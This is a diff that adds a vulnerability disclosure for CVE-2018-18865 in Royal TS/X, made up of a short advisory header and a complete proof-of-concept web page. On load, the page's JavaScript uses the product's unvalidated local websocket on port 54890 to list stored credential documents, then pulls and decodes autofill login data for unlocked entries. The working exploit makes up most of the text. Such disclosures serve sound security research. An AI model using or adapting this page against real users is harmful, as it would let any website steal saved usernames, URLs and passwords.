@@ -1,0 +1,126 @@
+<!--
+Title: Royal TS/X - Information Disclosure
+Author: Jakub Palaczynski
+Date: 10. July 2018
+CVE: CVE-2018-18865
+
+Affected product:
+=============
+
+Royal TS/X < Royal TS v5 Beta / Royal TSX v4 Beta
+
+
+Vulnerability - Information Disclosure:
+=============================
+
+Any third party web application can steal credentials created in Royal TS/X
+when browser extension is enabled.
+Browser extension communicates using websockets (default TCP port 54890)
+and websockets do not use any validation to verify origin of the request.
+
+
+PoC website:
+==========
+-->
+
+  <!DOCTYPE html>
+  <meta charset="utf-8" />
+  <title>RoyalTS/X Exploit</title>
+  <script language="javascript" type="text/javascript">
+
+  var wsUri = "ws://127.0.0.1:54890/";
+  var output;
+
+  function init()
+  {
+    output = document.getElementById("output");
+    testWebSocket();
+  }
+
+  function testWebSocket()
+  {
+writeToScreen("Let's retrieve some data...");
+    websocket = new WebSocket(wsUri);
+    websocket.onopen = function(evt) {
+onOpen(evt,"{\"Command\":\"GetDocuments\",\"Arguments\":null,\"PluginVersion\":\"1.0.0.0\",\"RequestId\":\"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\"}")
+};
+    websocket.onclose = function(evt) { onClose(evt) };
+    websocket.onmessage = function(evt) { onMessage(evt) };
+    websocket.onerror = function(evt) { onError(evt) };
+  }
+
+  function onOpen(evt,message)
+  {
+    doSend(message);
+  }
+
+  function onClose(evt)
+  {
+  }
+
+  function onMessage(evt)
+  {
+var obj = JSON.parse(evt.data);
+if (obj['Command'] == "GetDocuments") {
+for (var x in obj['ResponseData']){
+writeToScreen("Name: " + obj['ResponseData'][x]['Name']);
+writeToScreen("Unlocked: " + obj['ResponseData'][x]['Unlocked']);
+for (var y in obj['ResponseData'][x]['Credentials']){
+writeToScreen("Username: " +
+obj['ResponseData'][x]['Credentials'][y]['UserName']);
+writeToScreen("URL: " + obj['ResponseData'][x]['Credentials'][y]['URL']);
+if (obj['ResponseData'][x]['Unlocked'] == true){
+websocket.close();
+websocket = new WebSocket(wsUri);
+websocket.onopen = function(evt) {
+onOpen(evt,"{\"Command\":\"GetLoginInformation\",\"Arguments\":{\"CredentialId\":\""
++ obj['ResponseData'][x]['Credentials'][y]['ID'] +
+"\"},\"PluginVersion\":\"1.0.0.0\",\"RequestId\":\"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\"}")
+};
+websocket.onclose = function(evt) { onClose(evt) };
+websocket.onmessage = function(evt) { onMessage(evt) };
+websocket.onerror = function(evt) { onError(evt) };
+}
+}
+}
+}
+else {
+if (obj['Command'] == "GetLoginInformation") {
+var obj = JSON.parse(evt.data);
+writeToScreen("AutoFill Data: " + atob(obj['ResponseData']));
+}
+}
+  }
+
+  function onError(evt)
+  {
+    writeToScreen('<span style="color: red;">ERROR:</span> ' + evt.data);
+  }
+
+  function doSend(message)
+  {
+    websocket.send(message);
+  }
+
+  function writeToScreen(message)
+  {
+    var pre = document.createElement("p");
+    pre.style.wordWrap = "break-word";
+    pre.innerHTML = message;
+    output.appendChild(pre);
+  }
+
+  window.addEventListener("load", init, false);
+
+  </script>
+
+  <h2>RoyalTS/X Exploit</h2>
+
+  <div id="output"></div>
+
+<!--
+Contact:
+=======
+
+Jakub[dot]Palaczynski[at]gmail[dot]com
+-->
